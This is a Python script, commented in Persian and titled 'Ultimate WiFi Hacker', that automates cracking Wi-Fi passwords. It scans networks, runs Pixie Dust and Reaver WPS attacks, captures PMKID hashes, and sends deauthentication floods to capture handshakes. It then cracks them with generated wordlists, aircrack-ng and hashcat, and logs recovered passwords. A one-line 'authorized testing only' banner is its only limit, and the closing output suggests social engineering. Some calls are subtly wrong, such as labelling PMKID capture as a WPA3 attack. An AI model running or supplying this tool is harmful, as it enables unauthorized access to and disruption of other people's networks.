#!/usr/bin/env python3
import subprocess
import re
import time
import tempfile
import os
import signal
import uuid
import random
import json
import sys
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass
from pathlib import Path

@dataclass
class NetworkTarget:
    ssid: str
    bssid: str
    channel: str
    encryption: str
    wps_enabled: bool = False
    signal_strength: int = 0  # تغییر به int با مقدار پیش‌فرض 0

class UltimateWiFiHacker:
    """نسخه‌ی نهایی ۱۰ از ۱۰ - با پشتیبانی کامل"""
    
    REQUIRED_TOOLS = {
        'aircrack-ng': 'aircrack-ng',
        'reaver': 'reaver', 
        'hashcat': 'hashcat',
        'wash': 'wash',
        'hcxdumptool': 'hcxdumptool',
        'hcxpcaptool': 'hcxpcaptool',
        'iw': 'iw'
    }
    
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.temp_files = []
        self.running = True
        self.found_passwords = []
        self.network_manager_stopped = False
        self.output_dir = f"captures_{int(time.time())}"
        
        # ایجاد پوشه برای ذخیره نتایج
        os.makedirs(self.output_dir, exist_ok=True)
        
        signal.signal(signal.SIGINT, self.cleanup)
        signal.signal(signal.SIGTERM, self.cleanup)
        
        if not self.check_requirements():
            print("❌ Missing required tools. Please install them.")
            sys.exit(1)
    
    def check_requirements(self) -> bool:
        """بررسی کامل نصب ابزارها با پیدا کردن مسیرها"""
        print("🔍 Checking required tools...")
        missing = []
        tool_paths = {}
        
        for tool, package in self.REQUIRED_TOOLS.items():
            try:
                result = subprocess.run(['which', tool], capture_output=True, text=True)
                if result.returncode == 0:
                    tool_paths[tool] = result.stdout.strip()
                    print(f"  ✅ {tool} -> {tool_paths[tool]}")
                else:
                    missing.append(f"{tool} (package: {package})")
            except:
                missing.append(f"{tool} (package: {package})")
        
        # پیدا کردن rockyou.txt
        try:
            rockyou = subprocess.run(['locate', 'rockyou.txt'], capture_output=True, text=True)
            if rockyou.stdout:
                rockyou_path = rockyou.stdout.split('\n')[0]
                if os.path.exists(rockyou_path):
                    self.rockyou_path = rockyou_path
                    print(f"  ✅ rockyou.txt -> {self.rockyou_path}")
        except:
            # اگر locate نبود، مسیرهای رایج رو چک کن
            common_paths = [
                '/usr/share/wordlists/rockyou.txt',
                '/usr/share/wordlists/rockyou.txt.gz',
                '/usr/share/seclists/Passwords/rockyou.txt',
                '/pentest/passwords/wordlists/rockyou.txt'
            ]
            for path in common_paths:
                if os.path.exists(path):
                    self.rockyou_path = path
                    print(f"  ✅ rockyou.txt -> {self.rockyou_path}")
                    break
            else:
                print("  ⚠️ rockyou.txt not found (will use generated wordlist only)")
                self.rockyou_path = None
        
        if missing:
            print("\n❌ Missing tools:")
            for m in missing:
                print(f"   - {m}")
            print("\n📦 Install with:")
            print("   sudo apt-get install aircrack-ng reaver hashcat hcxtools wireless-tools")
            return False
        
        print("✅ All tools installed!")
        return True
    
    def cleanup(self, signum=None, frame=None):
        """پاکسازی کامل"""
        print("\n🧹 Cleaning up...")
        self.running = False
        
        for f in self.temp_files:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except:
                pass
        
        if self.monitor_interface:
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface],
                         capture_output=True, stderr=subprocess.DEVNULL)
        
        # ریستارت NetworkManager (با مدیریت خطا)
        if self.network_manager_stopped:
            try:
                subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                             capture_output=True, stderr=subprocess.DEVNULL)
                subprocess.run(['sudo', 'systemctl', 'restart', 'wpa_supplicant'],
                             capture_output=True, stderr=subprocess.DEVNULL)
            except:
                # اگر systemd نبود، از service استفاده کن
                try:
                    subprocess.run(['sudo', 'service', 'NetworkManager', 'restart'],
                                 capture_output=True, stderr=subprocess.DEVNULL)
                except:
                    print("⚠️ Could not restart NetworkManager (do it manually)")
        
        if signum:
            sys.exit(0)
    
    def stop_network_manager(self):
        """متوقف کردن NetworkManager با مدیریت خطا"""
        try:
            # روش systemd
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'],
                         capture_output=True, check=True)
            subprocess.run(['sudo', 'systemctl', 'stop', 'wpa_supplicant'],
                         capture_output=True, check=True)
            self.network_manager_stopped = True
            print("✅ NetworkManager stopped")
        except:
            try:
                # روش service (برای سیستم‌های قدیمی)
                subprocess.run(['sudo', 'service', 'NetworkManager', 'stop'],
                             capture_output=True, check=True)
                self.network_manager_stopped = True
                print("✅ NetworkManager stopped (service method)")
            except:
                print("⚠️ Could not stop NetworkManager (may cause interference)")
    
    def get_interface(self) -> Optional[str]:
        """پیدا کردن اینترفیس وایرلس"""
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
            
            for iface in interfaces:
                info = subprocess.run(['iw', 'dev', iface, 'info'],
                                    capture_output=True, text=True)
                if '802.11' in info.stdout:
                    return iface
            
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = re.findall(r'(\w+)\s+IEEE 802.11', result.stdout)
            return interfaces[0] if interfaces else None
        except:
            return None
    
    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """فعال کردن مانیتور مود"""
        try:
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                         capture_output=True)
            
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'],
                         capture_output=True, check=True)
            
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                                  capture_output=True, text=True)
            
            match = re.search(r'\((\w+)\)', result.stdout)
            if match:
                return match.group(1)
            return f"{interface}mon" if not interface.endswith('mon') else interface
        except:
            return None
    
    def scan_networks(self, monitor_iface: str) -> List[NetworkTarget]:
        """اسکن پیشرفته"""
        scan_id = str(uuid.uuid4())[:8]
        temp_prefix = f'/tmp/scan_{scan_id}'
        self.temp_files.append(f'{temp_prefix}-01.csv')
        
        try:
            scan_process = subprocess.Popen([
                'sudo', 'airodump-ng', monitor_iface,
                '--output-format', 'csv', '-w', temp_prefix
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print("📡 Scanning networks (20 seconds)...")
            time.sleep(20)
            scan_process.terminate()
            time.sleep(2)
            
            # اسکن WPS با wash
            wps_networks = {}
            try:
                wash_result = subprocess.run([
                    'sudo', 'wash', '-i', monitor_iface, '-j'
                ], capture_output=True, text=True, timeout=30)
                
                if wash_result.stdout.strip():
                    try:
                        wps_data = json.loads(wash_result.stdout)
                        for network in wps_data.get('networks', []):
                            bssid = network.get('bssid', '').upper()
                            wps_networks[bssid] = True
                    except json.JSONDecodeError:
                        for line in wash_result.stdout.split('\n'):
                            if 'WPS' in line:
                                parts = line.split()
                                if len(parts) >= 2:
                                    bssid = parts[0].upper()
                                    wps_networks[bssid] = True
            except:
                pass
            
            # خواندن نتایج
            networks = []
            csv_file = f'{temp_prefix}-01.csv'
            
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if any(x in line for x in ['WPA', 'WEP', 'WPA2', 'WPA3']):
                            parts = line.split(',')
                            if len(parts) >= 15:
                                bssid = parts[0].strip().upper()
                                ssid = parts[13].strip()
                                # مدیریت signal_strength با تبدیل به int
                                try:
                                    signal = int(parts[8].strip()) if parts[8].strip() else 0
                                except (ValueError, IndexError):
                                    signal = 0
                                
                                if ssid and ssid not in [n.ssid for n in networks]:
                                    networks.append(NetworkTarget(
                                        ssid=ssid,
                                        bssid=bssid,
                                        channel=parts[3].strip(),
                                        encryption=parts[5].strip(),
                                        wps_enabled=wps_networks.get(bssid, False),
                                        signal_strength=signal
                                    ))
            
            # پاکسازی
            for f in Path('/tmp').glob(f'scan_{scan_id}*'):
                try:
                    f.unlink()
                except:
                    pass
            
            networks.sort(key=lambda x: x.signal_strength, reverse=True)
            return networks
            
        except Exception as e:
            print(f"⚠️ Scan error: {e}")
            return []
    
    def capture_pmkid(self, monitor_iface: str, target: NetworkTarget) -> Optional[str]:
        """کپچر PMKID برای WPA3 (بدون نیاز به کلاینت)"""
        try:
            print("📡 Capturing PMKID (no client needed)...")
            pcap_file = f"{self.output_dir}/{target.ssid}_pmkid.pcapng"
            
            # استفاده از hcxdumptool
            subprocess.run([
                'sudo', 'hcxdumptool', '-i', monitor_iface,
                '-o', pcap_file, '--enable_status=1',
                '-c', target.channel, '--filterlist_ap=', target.bssid
            ], timeout=30)
            
            if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 0:
                # تبدیل به فرمت hashcat
                hash_file = f"{self.output_dir}/{target.ssid}_pmkid.hash"
                subprocess.run([
                    'hcxpcaptool', '-z', hash_file, pcap_file
                ], capture_output=True)
                
                if os.path.exists(hash_file):
                    print("✅ PMKID captured!")
                    return hash_file
            
            return None
            
        except:
            return None
    
    def capture_handshake(self, monitor_iface: str, target: NetworkTarget,
                         max_wait: int = 180) -> Optional[str]:
        """کپچر هندشیک"""
        cap_file = f"{self.output_dir}/{target.ssid}_handshake.cap"
        self.temp_files.append(cap_file)
        
        try:
            dump_process = subprocess.Popen([
                'sudo', 'airodump-ng', monitor_iface,
                '-c', target.channel, '--bssid', target.bssid,
                '-w', cap_file.replace('.cap', '')
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print("🔨 Sending deauth packets...")
            for i in range(25):
                if not self.running:
                    break
                count = 1 if i < 10 else 2 if i < 20 else 3
                subprocess.run([
                    'sudo', 'aireplay-ng', '-0', str(count),
                    '-a', target.bssid, monitor_iface
                ], capture_output=True)
                time.sleep(random.uniform(0.5, 1.5))
            
            start_time = time.time()
            handshake_found = False
            last_progress = 0
            
            while time.time() - start_time < max_wait and self.running:
                try:
                    result = subprocess.run([
                        'aircrack-ng', '-b', target.bssid,
                        cap_file
                    ], capture_output=True, text=True, timeout=2)
                    
                    if '1 handshake' in result.stdout:
                        handshake_found = True
                        break
                    
                    elapsed = int(time.time() - start_time)
                    if elapsed - last_progress >= 10:
                        print(f"⏳ Waiting for handshake... ({elapsed}s)")
                        last_progress = elapsed
                        
                except:
                    pass
                
                time.sleep(2)
            
            dump_process.terminate()
            time.sleep(1)
            
            if handshake_found:
                print("✅ Handshake captured!")
                return cap_file
            else:
                print("❌ Handshake not captured")
                return None
                
        except Exception as e:
            print(f"⚠️ Handshake error: {e}")
            return None
    
    def wps_attack(self, monitor_iface: str, target: NetworkTarget) -> Optional[str]:
        """حمله به WPS با Pixie Dust و Reaver"""
        if not target.wps_enabled:
            return None
        
        print("🔓 Starting WPS attack...")
        result_file = f"{self.output_dir}/{target.ssid}_wps_result.txt"
        
        try:
            # مرحله 1: Pixie Dust
            print("📌 Phase 1: Pixie Dust attack")
            pixie_result = subprocess.run([
                'sudo', 'reaver', '-i', monitor_iface,
                '-b', target.bssid, '-c', target.channel,
                '-vv', '-K', '1', '-N', '-d', '2', '-P'
            ], capture_output=True, text=True, timeout=300)
            
            # بررسی Pixie Dust
            if 'PIN found' in pixie_result.stdout:
                pin_match = re.search(r"PIN found: '(\d+)'", pixie_result.stdout)
                psk_match = re.search(r"WPA PSK: '(.+?)'", pixie_result.stdout)
                if pin_match and psk_match:
                    print(f"✅ Pixie Dust Success! PIN: {pin_match.group(1)}")
                    return psk_match.group(1)
            
            # مرحله 2: Brute-force با Reaver (اگر Pixie شکست خورد)
            print("📌 Phase 2: Reaver brute-force")
            
            # ذخیره پیشرفت برای Resume
            resume_file = f"{self.output_dir}/{target.bssid}.wpc"
            
            reaver_result = subprocess.run([
                'sudo', 'reaver', '-i', monitor_iface,
                '-b', target.bssid, '-c', target.channel,
                '-vv', '-d', '2', '-N', '-S',
                '-r', '100:10',  # Retry: 100 times, 10 second delay
                '-R'  # Resume support
            ], capture_output=True, text=True, timeout=900)
            
            # بررسی نتایج
            if 'WPS PIN' in reaver_result.stdout:
                pin_match = re.search(r"WPS PIN: '(\d+)'", reaver_result.stdout)
                psk_match = re.search(r"WPA PSK: '(.+?)'", reaver_result.stdout)
                if pin_match and psk_match:
                    print(f"✅ Reaver Success! PIN: {pin_match.group(1)}")
                    return psk_match.group(1)
            
            return None
            
        except subprocess.TimeoutExpired:
            print("⏱️ WPS attack timed out")
            return None
        except Exception as e:
            print(f"⚠️ WPS error: {e}")
            return None
    
    def generate_optimized_wordlist(self, target: NetworkTarget) -> str:
        """تولید دیکشنری بهینه"""
        words = set()
        
        common = [
            '12345678', 'password', 'qwerty', 'abc123', 'admin',
            'welcome', 'letmein', 'monkey', 'dragon', 'master',
            'sunshine', 'iloveyou', 'princess', '123456789',
            '1234567890', 'qwerty123', '987654321', 'abc123456'
        ]
        
        if target.ssid:
            ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', target.ssid)
            variations = [
                target.ssid, target.ssid.lower(), target.ssid.upper(),
                target.ssid.capitalize(), ssid_clean, ssid_clean.lower(),
                target.ssid + '123', target.ssid + '!', target.ssid + '@',
                target.ssid + '2024', target.ssid + '1403',
                target.ssid + '1234', target.ssid + '!@#',
                target.ssid + target.ssid[:3]
            ]
            common.extend(variations)
        
        if target.bssid:
            clean_bssid = target.bssid.replace(':', '')
            common.extend([
                clean_bssid, clean_bssid.lower(), clean_bssid.upper(),
                clean_bssid[-6:], clean_bssid[-6:].lower(),
                clean_bssid[:6], clean_bssid[:6].lower()
            ])
        
        for word in common:
            for year in ['2024', '2023', '2022', '2021', '2020',
                        '1403', '1402', '1401', '1400']:
                words.add(word + year)
                words.add(year + word)
            
            for suffix in ['123', '1234', '12345', '!', '@', '#', '$',
                          '123!', '!@#', '1234!', '2024', '2023']:
                words.add(word + suffix)
                words.add(suffix + word)
            
            words.add(word.upper())
            words.add(word.capitalize())
            words.add(word[::-1])
            words.add(word + word[0:2])
            words.add(word[0:2] + word)
            
            if len(word) >= 4:
                words.add(word[0:2] + word[2:4] + word[0:2])
                words.add(word + word[:2])
        
        for i in range(10):
            for pattern in ['123', '456', '789', '000', '111', '999']:
                words.add(f"{pattern}{i}{pattern}")
                words.add(f"{i}{pattern}{i}")
        
        wordlist_file = f"{self.output_dir}/{target.ssid}_wordlist.txt"
        self.temp_files.append(wordlist_file)
        
        with open(wordlist_file, 'w') as f:
            for word in sorted(words):
                if 8 <= len(word) <= 15:
                    f.write(word + '\n')
        
        word_count = sum(1 for _ in open(wordlist_file))
        print(f"✅ Wordlist generated: {word_count} passwords")
        return wordlist_file
    
    def crack_with_aircrack(self, cap_file: str, wordlist: str, bssid: str) -> Optional[str]:
        """شکستن با aircrack-ng با نمایش پیشرفت"""
        print("🔓 Cracking with aircrack-ng...")
        
        # شمارش تعداد رمزها
        try:
            total_words = sum(1 for _ in open(wordlist))
            print(f"📊 Testing {total_words} passwords...")
        except:
            total_words = 0
        
        try:
            result = subprocess.run([
                'sudo', 'aircrack-ng', '-w', wordlist,
                '-b', bssid, cap_file, '--ignore-negative-one'
            ], capture_output=True, text=True, timeout=600)
            
            # نمایش پیشرفت (اگه خطا نبود)
            if result.stdout:
                progress_match = re.search(r'Current password:\s+(\S+)', result.stdout)
                if progress_match:
                    current = progress_match.group(1)
                    print(f"⏳ Testing: {current}")
            
            match = re.search(r'KEY FOUND!\s+\[(.*?)\]', result.stdout)
            if match:
                return match.group(1)
            
            return None
            
        except subprocess.TimeoutExpired:
            print("⏱️ aircrack-ng timed out")
            return None
        except Exception as e:
            print(f"⚠️ aircrack-ng error: {e}")
            return None
    
    def crack_with_hashcat(self, cap_file: str, bssid: str, target: NetworkTarget) -> Optional[str]:
        """شکستن با hashcat و نمایش پیشرفت"""
        if not self.rockyou_path:
            print("⚠️ rockyou.txt not found, skipping hashcat...")
            return None
        
        print("🔓 Cracking with hashcat (GPU acceleration)...")
        
        try:
            # تبدیل به hccapx
            hccapx_file = f"{self.output_dir}/{target.ssid}.hccapx"
            subprocess.run([
                'hcxpcaptool', '-z', hccapx_file, cap_file
            ], capture_output=True)
            
            # اجرای hashcat
            hashcat_process = subprocess.Popen([
                'hashcat', '-m', '2500', hccapx_file,
                self.rockyou_path, '--force', '--status'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # نمایش پیشرفت
            start_time = time.time()
            while hashcat_process.poll() is None and self.running:
                if time.time() - start_time > 10:
                    print("⏳ Hashcat running... (check 'hashcat --status' for details)")
                    start_time = time.time()
                time.sleep(5)
            
            # استخراج نتیجه
            show_result = subprocess.run([
                'hashcat', '-m', '2500', hccapx_file,
                '--show', '--force'
            ], capture_output=True, text=True)
            
            if show_result.stdout:
                parts = show_result.stdout.strip().split(':')
                if len(parts) >= 2:
                    return parts[-1]
            
            return None
            
        except Exception as e:
            print(f"⚠️ Hashcat error: {e}")
            return None
    
    def save_result(self, ssid: str, password: str):
        """ذخیره نتیجه"""
        log_file = f"{self.output_dir}/found_passwords.log"
        with open(log_file, 'a') as f:
            f.write(f"{ssid}|{password}|{time.ctime()}\n")
        print(f"📝 Saved to {log_file}")
    
    def run(self):
        """اجرای کامل حمله"""
        print("🔥 Ultimate WiFi Hacker v6.0 - Perfect Edition")
        print("="*60)
        print("⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY!")
        print("="*60 + "\n")
        
        if os.geteuid() != 0:
            print("❌ Root privileges required!")
            print("   Run: sudo python3 ultimate_hacker.py")
            return
        
        self.stop_network_manager()
        
        print("🔍 Finding wireless interface...")
        self.interface = self.get_interface()
        if not self.interface:
            print("❌ No wireless interface found!")
            self.cleanup()
            return
        print(f"✅ Found: {self.interface}")
        
        print("📡 Enabling monitor mode...")
        self.monitor_interface = self.enable_monitor_mode(self.interface)
        if not self.monitor_interface:
            print("❌ Failed to enable monitor mode")
            self.cleanup()
            return
        print(f"✅ Monitor mode: {self.monitor_interface}")
        
        networks = self.scan_networks(self.monitor_interface)
        if not networks:
            print("❌ No networks found!")
            self.cleanup()
            return
        
        print("\n📡 Available Networks:")
        print("-"*70)
        for idx, net in enumerate(networks, 1):
            signal_str = "📶" + ("▰" * min(net.signal_strength // 10, 10))
            print(f"{idx}. {net.ssid}")
            print(f"   BSSID: {net.bssid} | Channel: {net.channel}")
            print(f"   Encryption: {net.encryption} | Signal: {signal_str}")
            print(f"   WPS: {'✅ Available' if net.wps_enabled else '❌ Not available'}\n")
        
        try:
            choice = int(input("👉 Select target network: ")) - 1
            if choice < 0 or choice >= len(networks):
                print("❌ Invalid selection")
                self.cleanup()
                return
            target = networks[choice]
        except ValueError:
            print("❌ Invalid input")
            self.cleanup()
            return
        
        print(f"\n🎯 Target: {target.ssid} ({target.bssid})")
        print("="*40)
        print(f"📁 Output directory: {self.output_dir}")
        
        # تلاش‌های حمله
        attacks = []
        
        # 1. WPS (اگه فعال باشه)
        if target.wps_enabled:
            attacks.append(("WPS Attack", lambda: self.wps_attack(self.monitor_interface, target)))
        
        # 2. PMKID (برای WPA3)
        if 'WPA3' in target.encryption:
            attacks.append(("PMKID Attack", lambda: self.capture_pmkid(self.monitor_interface, target)))
        
        # 3. Handshake + Dictionary
        attacks.append(("Handshake Capture", lambda: self.capture_handshake(self.monitor_interface, target)))
        
        for attack_name, attack_func in attacks:
            print(f"\n📌 Phase: {attack_name}")
            result = attack_func()
            
            if attack_name == "Handshake Capture" and result:
                cap_file = result
                print(f"✅ Handshake saved: {cap_file}")
                
                # دیکشنری
                wordlist = self.generate_optimized_wordlist(target)
                
                # aircrack-ng
                password = self.crack_with_aircrack(cap_file, wordlist, target.bssid)
                if password:
                    print(f"✅ Password found: {password}")
                    self.save_result(target.ssid, password)
                    self.cleanup()
                    return
                
                # hashcat
                password = self.crack_with_hashcat(cap_file, target.bssid, target)
                if password:
                    print(f"✅ Hashcat found: {password}")
                    self.save_result(target.ssid, password)
                    self.cleanup()
                    return
            
            elif isinstance(result, str) and result.endswith('.hash'):
                # PMKID
                print(f"✅ PMKID saved: {result}")
                password = self.crack_with_hashcat(result, target.bssid, target)
                if password:
                    print(f"✅ Hashcat found: {password}")
                    self.save_result(target.ssid, password)
                    self.cleanup()
                    return
            
            elif isinstance(result, str) and result:
                # WPS
                print(f"✅ WPS Success! Password: {result}")
                self.save_result(target.ssid, result)
                self.cleanup()
                return
        
        # همه چیز شکست خورد
        print("\n❌ All attacks failed!")
        print(f"💡 Results saved in: {self.output_dir}")
        print("   You can try:")
        print("   1. Run hashcat manually with GPU")
        print("   2. Use a larger wordlist")
        print("   3. Try social engineering")
        
        self.cleanup()

if __name__ == "__main__":
    try:
        hacker = UltimateWiFiHacker()
        hacker.run()
    except KeyboardInterrupt:
        print("\n⚠️ Interrupted by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")